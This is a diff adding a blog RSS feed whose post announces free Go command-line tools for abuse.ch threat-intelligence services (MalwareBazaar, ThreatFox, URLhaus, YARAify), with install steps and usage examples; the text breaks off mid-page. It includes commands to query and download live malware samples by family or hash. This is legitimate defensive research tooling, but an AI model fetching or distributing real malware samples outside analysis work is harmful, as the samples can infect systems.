@@ -1,0 +1,1203 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Open Source on andpalmier's blog</title><link>/tags/open-source/</link><description>Recent content in Open Source on andpalmier's blog</description><generator>Hugo -- gohugo.io</generator><language>en</language><lastBuildDate>Tue, 20 Jan 2026 00:00:00 +0000</lastBuildDate><atom:link href="/tags/open-source/index.xml" rel="self" type="application/rss+xml"/><item><title>Releasing an Abuse.ch toolkit for threat intelligence</title><link>/posts/abuse-ch-toolkit/</link><pubDate>Tue, 20 Jan 2026 00:00:00 +0000</pubDate><guid>/posts/abuse-ch-toolkit/</guid><description>
+&lt;h2 class="relative group"&gt;Introduction
+&lt;div id="introduction" class="anchor"&gt;&lt;/div&gt;
+&lt;span
+class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"&gt;
+&lt;a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#introduction" aria-label="Anchor"&gt;#&lt;/a&gt;
+&lt;/span&gt;
+&lt;/h2&gt;
+&lt;p&gt;While working on the post &lt;a href="/posts/cti-interview-preparation/" &gt;&amp;ldquo;Interview preparation for a Cyber Threat Intelligence role&amp;rdquo;&lt;/a&gt;, I realized that a lot of CTI tools need a subscription or a license in order to be used. That could be an issue, especially for small companies or people trying to enter the field.&lt;/p&gt;
+&lt;p&gt;To give back to the community and highlight the potential of community-driven platforms, I decided to put together 4 command-line tools to interact with some of the services from &lt;a href="https://abuse.ch" target="_blank" rel="noreferrer"&gt;Abuse.ch&lt;/a&gt;. You&amp;rsquo;re going to need an API key to use these tools, but &lt;a href="https://auth.abuse.ch/" target="_blank" rel="noreferrer"&gt;it is free to get one&lt;/a&gt;. Hopefully, they will be useful to some of you.&lt;/p&gt;
+&lt;p&gt;Here are the platforms covered by the toolset:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href="https://bazaar.abuse.ch" target="_blank" rel="noreferrer"&gt;&lt;strong&gt;MalwareBazaar&lt;/strong&gt;&lt;/a&gt;: for sharing malware samples.&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://threatfox.abuse.ch" target="_blank" rel="noreferrer"&gt;&lt;strong&gt;ThreatFox&lt;/strong&gt;&lt;/a&gt;: for sharing indicators of compromise (IOCs) associated with malware.&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://urlhaus.abuse.ch" target="_blank" rel="noreferrer"&gt;&lt;strong&gt;URLhaus&lt;/strong&gt;&lt;/a&gt;: for sharing malicious URLs being used for malware distribution.&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://yaraify.abuse.ch" target="_blank" rel="noreferrer"&gt;&lt;strong&gt;YARAify&lt;/strong&gt;&lt;/a&gt;: a repository of YARA rules to identify and classify malware, can be used to share rules, hunt, and scan.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;I&amp;rsquo;m aware that &lt;a href="https://abuse.ch/blog/creating-sustainability-for-abuse-ch-and-its-community/" target="_blank" rel="noreferrer"&gt;abuse.ch and Spamhaus are working on a commercial model to sustain the services&lt;/a&gt;, but they also say &lt;em&gt;&amp;ldquo;if you contribute data, you will be able to access the data for free&amp;rdquo;&lt;/em&gt;. Some of these tools I&amp;rsquo;m releasing can help you make those contributions. So check them out, and let&amp;rsquo;s keep the collaboration alive!&lt;/p&gt;
+&lt;h3 class="relative group"&gt;Less is more
+&lt;div id="less-is-more" class="anchor"&gt;&lt;/div&gt;
+&lt;span
+class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"&gt;
+&lt;a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#less-is-more" aria-label="Anchor"&gt;#&lt;/a&gt;
+&lt;/span&gt;
+&lt;/h3&gt;
+&lt;p&gt;I developed these tools with some principles in mind:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;UNIX philosophy&lt;/strong&gt;: Do one thing and do it well, each tool maps to one specific service.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;No dependencies&lt;/strong&gt;: Written in Go using &lt;em&gt;only&lt;/em&gt; the standard library. No &lt;code&gt;node_modules&lt;/code&gt; black holes, no dependency hell: just small binaries that work.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;JSON first&lt;/strong&gt;: Output is JSON by default. It can be piped to &lt;code&gt;jq&lt;/code&gt;, ingested into a SIEM, or scripted around easily.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Container ready&lt;/strong&gt;: Docker/Podman images are available for every tool.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 class="relative group"&gt;Installation and first steps
+&lt;div id="installation-and-first-steps" class="anchor"&gt;&lt;/div&gt;
+&lt;span
+class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"&gt;
+&lt;a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#installation-and-first-steps" aria-label="Anchor"&gt;#&lt;/a&gt;
+&lt;/span&gt;
+&lt;/h2&gt;
+&lt;p&gt;The installation process has four options:&lt;/p&gt;
+&lt;p&gt;🍺 &lt;strong&gt;Using brew&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;The easiest way to install any of these tools on macOS (or Linux via Linuxbrew) is through the custom tap:&lt;/p&gt;
+&lt;div class="highlight-wrapper"&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;brew tap andpalmier/tap
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;brew install mbzr tfox urlhs yrfy&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;🏃‍♂️ &lt;strong&gt;Using Go&lt;/strong&gt;&lt;/p&gt;
+&lt;div class="highlight-wrapper"&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;go install github.com/andpalmier/mbzr@latest&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;🐳 &lt;strong&gt;Using containers (Docker/Podman)&lt;/strong&gt;&lt;/p&gt;
+&lt;div class="highlight-wrapper"&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# Pull pre-built image&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;docker pull ghcr.io/andpalmier/tfox:latest
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# Or build locally&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;git clone https://github.com/andpalmier/tfox.git
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;docker build -t tfox .&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;✅ &lt;strong&gt;From source&lt;/strong&gt;&lt;/p&gt;
+&lt;div class="highlight-wrapper"&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;git clone https://github.com/andpalmier/urlhs.git
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nb"&gt;cd&lt;/span&gt; urlhs
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;make build&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;BONUS: ⬇️ &lt;strong&gt;Binaries from GitHub&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;Plus, the GitHub page of every tool has a &amp;ldquo;Releases&amp;rdquo; section with pre-built binaries, so you can download them from there.&lt;/p&gt;
+&lt;figure&gt;
+&lt;img class="my-0 rounded-md" src="/images/posts/abuse-ch-toolkit/releases_yrfy.jpg" alt="yrfy releases" /&gt;
+&lt;figcaption&gt;&lt;a href="https://github.com/andpalmier/yrfy/releases" target="_blank" rel="noreferrer"&gt;yrfy releases&lt;/a&gt;&lt;/figcaption&gt;
+&lt;/figure&gt;
+&lt;h3 class="relative group"&gt;API key setup
+&lt;div id="api-key-setup" class="anchor"&gt;&lt;/div&gt;
+&lt;span
+class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"&gt;
+&lt;a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#api-key-setup" aria-label="Anchor"&gt;#&lt;/a&gt;
+&lt;/span&gt;
+&lt;/h3&gt;
+&lt;p&gt;An API key is required to use all of the tools. You can get one for free from &lt;a href="https://auth.abuse.ch/" target="_blank" rel="noreferrer"&gt;abuse.ch authentication portal&lt;/a&gt;, and then export it as environment variable:&lt;/p&gt;
+&lt;div class="highlight-wrapper"&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nb"&gt;export&lt;/span&gt; &lt;span class="nv"&gt;ABUSECH_API_KEY&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;your_api_key_here&amp;#34;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h2 class="relative group"&gt;Introducing the toolkit
+&lt;div id="introducing-the-toolkit" class="anchor"&gt;&lt;/div&gt;
+&lt;span
+class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"&gt;
+&lt;a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#introducing-the-toolkit" aria-label="Anchor"&gt;#&lt;/a&gt;
+&lt;/span&gt;
+&lt;/h2&gt;
+&lt;h3 class="relative group"&gt;Get fresh samples with mbzr
+&lt;div id="get-fresh-samples-with-mbzr" class="anchor"&gt;&lt;/div&gt;
+&lt;span
+class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"&gt;
+&lt;a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#get-fresh-samples-with-mbzr" aria-label="Anchor"&gt;#&lt;/a&gt;
+&lt;/span&gt;
+&lt;/h3&gt;
+&lt;p&gt;&lt;a href="https://github.com/andpalmier/mbzr" target="_blank" rel="noreferrer"&gt;&lt;strong&gt;mbzr&lt;/strong&gt;&lt;/a&gt; serves as an interface to &lt;a href="https://bazaar.abuse.ch" target="_blank" rel="noreferrer"&gt;&lt;strong&gt;MalwareBazaar&lt;/strong&gt;&lt;/a&gt;, which has a massive &lt;a href="/posts/cti-interview-preparation/#finding-malware" &gt;database of malware samples&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;When could it be useful?&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;When analyzing a campaign, you may need to get fresh samples of a specific malware family (e.g., Emotet), or retrieve a specific binary from its hash.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Examples:&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;Retrieve the last 5 Emotet samples:&lt;/p&gt;
+&lt;div class="highlight-wrapper"&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;mbzr query -tag Emotet -limit &lt;span class="m"&gt;5&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Or download a binary:&lt;/p&gt;
+&lt;div class="highlight-wrapper"&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;mbzr download -sha256 &amp;lt;hash&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;div class="github-card-wrapper"&gt;
+&lt;a id="github-d5fad16f8c9749259d788657085abfe2" target="_blank" href="https://github.com/andpalmier/mbzr" class="cursor-pointer"&gt;
+&lt;div
+class="w-full md:w-auto p-0 m-0 border border-neutral-200 dark:border-neutral-700 border rounded-md shadow-2xl"&gt;&lt;div class="w-full nozoom"&gt;
+&lt;img
+src="https://opengraph.githubassets.com/0/andpalmier/mbzr"
+alt="GitHub Repository Thumbnail"
+class="nozoom mt-0 mb-0 w-full h-full object-cover"&gt;
+&lt;/div&gt;&lt;div class="w-full md:w-auto pt-3 p-5"&gt;
+&lt;div class="flex items-center"&gt;
+&lt;span class="text-2xl text-neutral-800 dark:text-neutral me-2"&gt;
+&lt;span class="relative block icon"&gt;&lt;svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"&gt;&lt;path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/&gt;&lt;/svg&gt;
+&lt;/span&gt;
+&lt;/span&gt;
+&lt;div
+id="github-d5fad16f8c9749259d788657085abfe2-full_name"
+class="m-0 font-bold text-xl text-neutral-800 decoration-primary-500 hover:underline hover:underline-offset-2 dark:text-neutral"&gt;
+andpalmier/mbzr
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p id="github-d5fad16f8c9749259d788657085abfe2-description" class="m-0 mt-2 text-md text-neutral-800 dark:text-neutral"&gt;
+A cli tool to interact with MalwareBazaar API
+&lt;/p&gt;
+&lt;div class="m-0 mt-2 flex items-center"&gt;
+&lt;span class="mr-1 inline-block h-3 w-3 rounded-full language-dot" data-language="Go"&gt;&lt;/span&gt;
+&lt;div class="m-0 mr-5 text-md text-neutral-800 dark:text-neutral"&gt;
+Go
+&lt;/div&gt;
+&lt;span class="text-md mr-1 text-neutral-800 dark:text-neutral"&gt;
+&lt;span class="relative block icon"&gt;&lt;svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512"&gt;&lt;path fill="currentColor" d="M287.9 0C297.1 0 305.5 5.25 309.5 13.52L378.1 154.8L531.4 177.5C540.4 178.8 547.8 185.1 550.7 193.7C553.5 202.4 551.2 211.9 544.8 218.2L433.6 328.4L459.9 483.9C461.4 492.9 457.7 502.1 450.2 507.4C442.8 512.7 432.1 513.4 424.9 509.1L287.9 435.9L150.1 509.1C142.9 513.4 133.1 512.7 125.6 507.4C118.2 502.1 114.5 492.9 115.1 483.9L142.2 328.4L31.11 218.2C24.65 211.9 22.36 202.4 25.2 193.7C28.03 185.1 35.5 178.8 44.49 177.5L197.7 154.8L266.3 13.52C270.4 5.249 278.7 0 287.9 0L287.9 0zM287.9 78.95L235.4 187.2C231.9 194.3 225.1 199.3 217.3 200.5L98.98 217.9L184.9 303C190.4 308.5 192.9 316.4 191.6 324.1L171.4 443.7L276.6 387.5C283.7 383.7 292.2 383.7 299.2 387.5L404.4 443.7L384.2 324.1C382.9 316.4 385.5 308.5 391 303L476.9 217.9L358.6 200.5C350.7 199.3 343.9 194.3 340.5 187.2L287.9 78.95z"/&gt;&lt;/svg&gt;&lt;/span&gt;
+&lt;/span&gt;
+&lt;div id="github-d5fad16f8c9749259d788657085abfe2-stargazers" class="m-0 mr-5 text-md text-neutral-800 dark:text-neutral"&gt;
+4
+&lt;/div&gt;
+&lt;span class="text-md mr-1 text-neutral-800 dark:text-neutral"&gt;
+&lt;span class="relative block icon"&gt;&lt;svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"&gt;&lt;path fill="currentColor" d="M80 104c13.3 0 24-10.7 24-24s-10.7-24-24-24S56 66.7 56 80s10.7 24 24 24zm80-24c0 32.8-19.7 61-48 73.3V192c0 17.7 14.3 32 32 32H304c17.7 0 32-14.3 32-32V153.3C307.7 141 288 112.8 288 80c0-44.2 35.8-80 80-80s80 35.8 80 80c0 32.8-19.7 61-48 73.3V192c0 53-43 96-96 96H256v70.7c28.3 12.3 48 40.5 48 73.3c0 44.2-35.8 80-80 80s-80-35.8-80-80c0-32.8 19.7-61 48-73.3V288H144c-53 0-96-43-96-96V153.3C19.7 141 0 112.8 0 80C0 35.8 35.8 0 80 0s80 35.8 80 80zm208 24c13.3 0 24-10.7 24-24s-10.7-24-24-24s-24 10.7-24 24s10.7 24 24 24zM248 432c0-13.3-10.7-24-24-24s-24 10.7-24 24s10.7 24 24 24s24-10.7 24-24z"/&gt;&lt;/svg&gt;&lt;/span&gt;
+&lt;/span&gt;
+&lt;div id="github-d5fad16f8c9749259d788657085abfe2-forks" class="m-0 mr-5 text-md text-neutral-800 dark:text-neutral"&gt;
+2
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;script
+async
+type="text/javascript"
+src="/js/fetch-repo.min.dc5533c50cefd50405344b235937142271f26229fe39cbee27fd4960e8bb897a0beebfad77a1091ca91cd0d1fb14e70fc37cc114dd9674fb2c32e0ab512ec8a4.js"
+integrity="sha512-3FUzxQzv1QQFNEsjWTcUInHyYin&amp;#43;OcvuJ/1JYOi7iXoL7r&amp;#43;td6EJHKkc0NH7FOcPw3zBFN2WdPssMuCrUS7IpA=="
+data-repo-url="https://api.github.com/repos/andpalmier/mbzr"
+data-repo-id="github-d5fad16f8c9749259d788657085abfe2"&gt;&lt;/script&gt;
+&lt;/a&gt;
+&lt;/div&gt;
+&lt;h3 class="relative group"&gt;Hunt for IOCs with tfox
+&lt;div id="hunt-for-iocs-with-tfox" class="anchor"&gt;&lt;/div&gt;
+&lt;span
+class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"&gt;
+&lt;a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#hunt-for-iocs-with-tfox" aria-label="Anchor"&gt;#&lt;/a&gt;
+&lt;/span&gt;
+&lt;/h3&gt;
+&lt;p&gt;&lt;a href="https://github.com/andpalmier/tfox" target="_blank" rel="noreferrer"&gt;&lt;strong&gt;tfox&lt;/strong&gt;&lt;/a&gt; taps into &lt;a href="https://threatfox.abuse.ch" target="_blank" rel="noreferrer"&gt;&lt;strong&gt;ThreatFox&lt;/strong&gt;&lt;/a&gt;, a platform for sharing &lt;a href="/posts/cti-interview-preparation/#ioc-vs-ioa" &gt;Indicators of Compromise (IOCs)&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;When could it be useful?&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;When observing a suspicious domain or IP in logs, the typical first step is to verify if it&amp;rsquo;s in a known database of IOCs.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Examples:&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;Verify if &amp;ldquo;evil.com&amp;rdquo; is in ThreatFox:&lt;/p&gt;
+&lt;div class="highlight-wrapper"&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;tfox search -ioc evil.com&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Or get the IOCs reported in the last 24 hours:&lt;/p&gt;
+&lt;div class="highlight-wrapper"&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;tfox recent -days &lt;span class="m"&gt;1&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;div class="github-card-wrapper"&gt;
+&lt;a id="github-d8f9c007e16436bf7e96a8617e4b651b" target="_blank" href="https://github.com/andpalmier/tfox" class="cursor-pointer"&gt;
+&lt;div
+class="w-full md:w-auto p-0 m-0 border border-neutral-200 dark:border-neutral-700 border rounded-md shadow-2xl"&gt;&lt;div class="w-full nozoom"&gt;
+&lt;img
+src="https://opengraph.githubassets.com/0/andpalmier/tfox"
+alt="GitHub Repository Thumbnail"
+class="nozoom mt-0 mb-0 w-full h-full object-cover"&gt;
+&lt;/div&gt;&lt;div class="w-full md:w-auto pt-3 p-5"&gt;
+&lt;div class="flex items-center"&gt;
+&lt;span class="text-2xl text-neutral-800 dark:text-neutral me-2"&gt;
+&lt;span class="relative block icon"&gt;&lt;svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"&gt;&lt;path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/&gt;&lt;/svg&gt;
+&lt;/span&gt;
+&lt;/span&gt;
+&lt;div
+id="github-d8f9c007e16436bf7e96a8617e4b651b-full_name"
+class="m-0 font-bold text-xl text-neutral-800 decoration-primary-500 hover:underline hover:underline-offset-2 dark:text-neutral"&gt;
+andpalmier/tfox
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p id="github-d8f9c007e16436bf7e96a8617e4b651b-description" class="m-0 mt-2 text-md text-neutral-800 dark:text-neutral"&gt;
+CLI tool to search in ThreatFox IOC database
+&lt;/p&gt;
+&lt;div class="m-0 mt-2 flex items-center"&gt;
+&lt;span class="mr-1 inline-block h-3 w-3 rounded-full language-dot" data-language="Go"&gt;&lt;/span&gt;
+&lt;div class="m-0 mr-5 text-md text-neutral-800 dark:text-neutral"&gt;
+Go
+&lt;/div&gt;
+&lt;span class="text-md mr-1 text-neutral-800 dark:text-neutral"&gt;
+&lt;span class="relative block icon"&gt;&lt;svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512"&gt;&lt;path fill="currentColor" d="M287.9 0C297.1 0 305.5 5.25 309.5 13.52L378.1 154.8L531.4 177.5C540.4 178.8 547.8 185.1 550.7 193.7C553.5 202.4 551.2 211.9 544.8 218.2L433.6 328.4L459.9 483.9C461.4 492.9 457.7 502.1 450.2 507.4C442.8 512.7 432.1 513.4 424.9 509.1L287.9 435.9L150.1 509.1C142.9 513.4 133.1 512.7 125.6 507.4C118.2 502.1 114.5 492.9 115.1 483.9L142.2 328.4L31.11 218.2C24.65 211.9 22.36 202.4 25.2 193.7C28.03 185.1 35.5 178.8 44.49 177.5L197.7 154.8L266.3 13.52C270.4 5.249 278.7 0 287.9 0L287.9 0zM287.9 78.95L235.4 187.2C231.9 194.3 225.1 199.3 217.3 200.5L98.98 217.9L184.9 303C190.4 308.5 192.9 316.4 191.6 324.1L171.4 443.7L276.6 387.5C283.7 383.7 292.2 383.7 299.2 387.5L404.4 443.7L384.2 324.1C382.9 316.4 385.5 308.5 391 303L476.9 217.9L358.6 200.5C350.7 199.3 343.9 194.3 340.5 187.2L287.9 78.95z"/&gt;&lt;/svg&gt;&lt;/span&gt;
+&lt;/span&gt;
+&lt;div id="github-d8f9c007e16436bf7e96a8617e4b651b-stargazers" class="m-0 mr-5 text-md text-neutral-800 dark:text-neutral"&gt;
+0
+&lt;/div&gt;
+&lt;span class="text-md mr-1 text-neutral-800 dark:text-neutral"&gt;
+&lt;span class="relative block icon"&gt;&lt;svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"&gt;&lt;path fill="currentColor" d="M80 104c13.3 0 24-10.7 24-24s-10.7-24-24-24S56 66.7 56 80s10.7 24 24 24zm80-24c0 32.8-19.7 61-48 73.3V192c0 17.7 14.3 32 32 32H304c17.7 0 32-14.3 32-32V153.3C307.7 141 288 112.8 288 80c0-44.2 35.8-80 80-80s80 35.8 80 80c0 32.8-19.7 61-48 73.3V192c0 53-43 96-96 96H256v70.7c28.3 12.3 48 40.5 48 73.3c0 44.2-35.8 80-80 80s-80-35.8-80-80c0-32.8 19.7-61 48-73.3V288H144c-53 0-96-43-96-96V153.3C19.7 141 0 112.8 0 80C0 35.8 35.8 0 80 0s80 35.8 80 80zm208 24c13.3 0 24-10.7 24-24s-10.7-24-24-24s-24 10.7-24 24s10.7 24 24 24zM248 432c0-13.3-10.7-24-24-24s-24 10.7-24 24s10.7 24 24 24s24-10.7 24-24z"/&gt;&lt;/svg&gt;&lt;/span&gt;
+&lt;/span&gt;
+&lt;div id="github-d8f9c007e16436bf7e96a8617e4b651b-forks" class="m-0 mr-5 text-md text-neutral-800 dark:text-neutral"&gt;
+0
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;script
+async
+type="text/javascript"
